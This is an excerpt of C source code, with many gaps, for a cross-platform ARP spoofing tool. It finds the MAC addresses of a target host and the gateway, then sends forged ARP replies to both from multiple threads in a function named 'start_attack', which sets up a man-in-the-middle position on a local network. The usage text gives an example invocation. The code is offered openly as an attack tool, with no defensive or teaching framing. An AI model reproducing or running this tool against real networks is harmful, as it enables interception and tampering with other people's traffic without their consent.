...
int check_requirements() {
  const char *dll_paths[] = {"C:\\Windows\\System32\\wpcap.dll",
...
char *get_controller_name(const char *interface_name) {
  ...
  ret =
      GetAdaptersAddresses(AF_UNSPEC, 0, NULL, adapter_addresses, &out_buf_len);
  if (ret == ERROR_BUFFER_OVERFLOW) {
    ...
    ret = GetAdaptersAddresses(AF_UNSPEC, 0, NULL, adapter_addresses,
                               &out_buf_len);
  }
  ...
  for (IP_ADAPTER_ADDRESSES *adapter = adapter_addresses; adapter;
...
pcap_t *open_adapter(char *net_interface) {
  ...
  for (device = alldevs; device != NULL; device = device->next) {
    ...
    if (device->description &&
        strstr(device->description, target_description)) {
...
void get_mac_address(char *net_interface, uint8_t *mac) {
  ...
  fscanf(fp, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2],
         &mac[3], &mac[4], &mac[5]);
...
void craft_arp_broadcast_packet(uint8_t *packet, uint8_t *source_mac,
                                uint8_t *sender_ip, uint8_t *target_ip) {
...
void craft_arp_target_packet(uint8_t *packet, uint8_t *source_mac,
                             uint8_t *target_mac, uint8_t *sender_ip,
                             uint8_t *target_ip) {
...
#ifdef _WIN32
void send_arp_request(pcap_t *handle, uint8_t *source_mac, uint8_t *sender_ip,
                      uint8_t *target_ip) {
...
#else
void send_arp_request(int sockfd, char *net_interface, uint8_t *source_mac,
                      uint8_t *sender_ip, uint8_t *target_ip) {
  uint8_t packet[PACKET_LEN];
  craft_arp_broadcast_packet(packet, source_mac, sender_ip, target_ip);
  ...
  if (sendto(sockfd, packet, PACKET_LEN, 0, (struct sockaddr *)&addr,
             sizeof(addr)) < 0) {
...
#ifdef _WIN32
void receive_destination_mac(pcap_t *handle, uint8_t *sender_ip,
                             uint8_t *host_mac, uint8_t *target_ip,
                             uint8_t *sender_mac) {
  printf("[i] Waiting for ARP reply from %d.%d.%d.%d...\n", target_ip[0],
         target_ip[1], target_ip[2], target_ip[3]);
  ...
  while (!shutdown_initialized) {
    ...
    printf("[i] Received ARP reply from %d.%d.%d.%d\n", packet[28], packet[29],
           packet[30], packet[31]);
    if (packet[12] == 0x08 && packet[13] == 0x06 && packet[20] == 0x00 &&
        packet[21] == 0x02) {
...
#else
void receive_destination_mac(int sockfd, char *net_interface,
                             uint8_t *sender_ip, uint8_t *host_mac,
                             uint8_t *target_ip, uint8_t *sender_mac) {
  ...
  while (!shutdown_initialized) {
    ...
    if (buffer[12] == 0x08 && buffer[13] == 0x06 && buffer[20] == 0x00 &&
        buffer[21] == 0x02) {
...
#ifdef _WIN32
int send_packet(uint8_t *source_mac, uint8_t *sender_ip, uint8_t *target_mac,
                uint8_t *target_ip, char *net_interface) {
  uint8_t packet[PACKET_LEN];
...
int send_packet(uint8_t *source_mac, uint8_t *sender_ip, uint8_t *target_mac,
  ...
  while (!shutdown_initialized) {
    printf("[i] Packets already sent: %d\r", atomic_load(&packet_count));
    fflush(stdout);
    if (sendto(raw_socket, packet, sizeof(packet), 0, (struct sockaddr *)&addr,
               sizeof(addr)) < 0) {
      printf("[E] Error: Failed to send ARP packet to %d.%d.%d.%d\n",
             target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
      perror("[E] Error: ");
...
DWORD WINAPI run_target_thread(LPVOID args) {
  ...
  send_packet(data->source_mac, data->gateway_ip, data->target_mac,
              data->target_ip, data->net_interface);
  return 0;
}

DWORD WINAPI run_gateway_thread(LPVOID args) {
  struct thread_data *data = (struct thread_data *)args;
  send_packet(data->source_mac, data->target_ip, data->gateway_mac,
              data->gateway_ip, data->net_interface);
  return 0;
}
#else
...
void start_attack(struct thread_data *data) {
  ...
  HANDLE *gateway_threads =
      (HANDLE *)malloc(data->threads / 2 * sizeof(HANDLE));
  ...
  for (int i = 0; i < data->threads / 2; i++) {
    gateway_threads[i] =
        CreateThread(NULL, 0, run_gateway_thread, data, 0, NULL);
...
void usage_menu(char *argv[]) {
  printf("ARP spoofer version %s\n", version);
  printf("Usage: %s -i <interface> -sip <sender_ip> -tip <target_ip> -gip "
         "<gateway_ip>\n",
         argv[0]);
  printf("Positional: \n");
  ...
  printf("Example: %s -i eth0 -sip 129.23.123.12 -gip 129.23.123.1 -tip "
         "129.23.123.43\n",
         argv[0]);
}

int parse_args(int argc, char *argv[], char *net_interface, uint8_t *sender_ip,
               uint8_t *target_ip, uint8_t *target_mac, uint8_t *gateway_ip,
               uint8_t *gateway_mac, int *threads) {
...
int main(int argc, char *argv[]) {
  ...
  if (parse_args(argc, argv, net_interface, sender_ip, target_ip, target_mac,
                 gateway_ip, gateway_mac, &threads) < 0) {
    return -1;
  }
...
#ifdef _WIN32
    receive_destination_mac(handle, sender_ip, source_mac, gateway_ip,
                            gateway_mac);
#else
    receive_destination_mac(sockfd, net_interface, sender_ip, source_mac,
  ...
  if (!check_mac(target_mac)) {
    printf("[i] Getting MAC address for target %d.%d.%d.%d\n", target_ip[0],
           target_ip[1], target_ip[2], target_ip[3]);
#ifdef _WIN32
    receive_destination_mac(handle, sender_ip, source_mac, target_ip,
                            target_mac);
#else
    receive_destination_mac(sockfd, net_interface, sender_ip, source_mac,
